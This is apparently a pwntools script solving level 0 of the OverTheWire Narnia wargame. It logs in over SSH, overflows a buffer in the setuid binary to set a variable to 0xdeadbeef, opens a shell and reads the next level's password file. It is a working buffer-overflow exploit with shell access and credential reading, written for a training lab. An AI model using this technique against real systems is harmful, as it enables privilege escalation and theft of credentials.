from pwn import *
context(arch='i386', os='linux')
s = ssh(user='narnia0', host='narnia.labs.overthewire.org', password='narnia0', port=2226)
#use a buffer overflow to change a variable to the value 0xdeadbeef then run a shell to open
#the password file for the next level
sh = s.run('(python -c \'print "A"*20+"\xef\xbe\xad\xde"\';cat) | /narnia/narnia0')
sh.sendline('cat /etc/narnia_pass/narnia1')
ans=sh.recvline()
for i in range(3):
    ans+=sh.recvline()
log.info('Flag: '+ans[-11:])
s.close()